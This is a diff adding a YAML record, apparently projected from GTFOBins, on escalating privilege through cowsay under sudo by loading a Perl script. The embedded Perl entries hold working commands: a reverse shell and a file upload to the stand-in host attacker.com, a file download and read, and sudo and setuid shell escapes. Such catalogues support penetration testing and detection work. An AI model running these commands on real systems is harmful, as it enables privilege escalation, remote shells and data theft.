@@ -1,0 +1,130 @@
+id: gtfobins/cowsay/inherit/sudo
+type: binary
+platform: linux
+name: cowsay
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- command-execution
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+commands:
+- template: cowsay -f /path/to/script.pl x
+references:
+- https://gtfobins.github.io/gtfobins/cowsay/
+- https://gtfobins.github.io/gtfobins/perl/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        cowsay:
+          functions:
+            inherit:
+            - code: cowsay -f /path/to/script.pl x
+              contexts:
+                sudo: null
+                unprivileged: null
+              from: perl
+        perl:
+          functions:
+            download:
+            - code: 'perl -MIO::Socket::INET -e ''$s=new IO::Socket::INET(PeerAddr=>"attacker.com",PeerPort=>80,Proto=>"tcp")
+                or die; print $s "GET /path/to/input-file HTTP/1.1\r\nHost: attacker.com\r\nMetadata:
+                true\r\nConnection: close\r\n\r\n"; open(my $fh, ">", "/path/to/output-file") or die;
+                $in_content = 0; while (<$s>) { if ($in_content) { print $fh $_; } elsif ($_ eq "\r\n")
+                { $in_content = 1; } } close($s); close($fh);'''
+              contexts:
+                sudo: null
+                unprivileged: null
+              sender: http-server
+            file-read:
+            - code: perl -ne print /path/to/input-file
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+            reverse-shell:
+            - code: perl -e 'use Socket;$i="attacker.com";$p=12345;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh
+                -i");};'
+              contexts:
+                sudo: null
+                unprivileged: null
+              listener: tcp-server
+            shell:
+            - code: perl -e 'exec "/bin/sh"'
+              contexts:
+                capabilities:
+                  code: perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh"'
+                  list:
+                  - CAP_SETUID
+                sudo: null
+                unprivileged: null
+            - code: PERL5OPT=-d PERL5DB='exec "/bin/sh"' perl /dev/null
+              comment: The `/dev/null` part can be omitted, just use `Ctrl-D` in order to spawn the shell.
+              contexts:
+                sudo: null
+                unprivileged: null
+            upload:
+            - code: 'perl -MIO::Socket::INET -e ''$s = new IO::Socket::INET(PeerAddr=>"attacker.com",
+                PeerPort=>80, Proto=>"tcp") or die;open(my $file, "<", "/path/to/input-file") or die;$content
+                = join("", <$file>);close($file);$headers = "POST / HTTP/1.1\r\nHost: attacker.com\r\nContent-Type:
+                application/x-www-form-urlencoded\r\nContent-Length: " . length($content) . "\r\nConnection:
+                close\r\n\r\n";print $s $headers . $content;while (<$s>) { }close($s);'''
+              contexts:
+                sudo: null
+                unprivileged: null
+              receiver: http-server
+    upstream_url: https://gtfobins.github.io/gtfobins/cowsay/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: command-execution
+    provenance:
+      type: heuristic
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+      note: Upstream inherit activation snippet; no downstream capability is inferred from its target.
+    confidence:
+      level: low
+  phases:
+  - value: execution
+    provenance:
+      type: heuristic
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+      note: Upstream inherit activation snippet; no downstream capability is inferred from its target.
+    confidence:
+      level: low
+  - value: privilege-escalation
+    provenance:
+      type: heuristic
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+      note: Upstream inherit activation snippet; no downstream capability is inferred from its target.
+    confidence:
+      level: low
+  privilege_required:
+    value: sudo
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:ea0c2978f96fb6fe2da3224f7d429dfa4ab84c2e930981e8851add92bff6e69b
